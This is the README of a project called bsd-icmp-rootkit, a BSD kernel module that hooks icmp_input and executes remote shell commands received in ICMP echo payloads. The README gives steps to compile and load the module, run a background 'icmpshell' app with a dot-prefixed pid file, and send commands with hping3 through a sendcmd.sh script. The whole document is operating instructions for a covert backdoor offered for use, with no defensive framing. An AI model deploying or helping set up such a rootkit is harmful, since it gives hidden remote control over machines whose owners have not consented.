# bsd-icmp-rootkit
hook icmp_input system call, and execute a shell remote command

## Installation  :

To compile the kernel module and the icmpshell app :
```
$ ./install_module.sh
```

## Load the module

This script load the module roughiz, run the app in background and write the pid of the app to file .__icmpshell.pid
```
$ ./load_module.sh
```

## Unload the module

This script unload the module roughiz
```
$ ./unload_module.sh
```

## Send a command to the remote rootkit

You can send a command to the rootkit, with the hping3 tool (try apt-get install hping3 if you want to install it) by sending an icmp echo with a payload.
To make this, you can execute the script :
```
$ ./sendcmd.sh [ip address of the remote machine or the hostname]
``` 

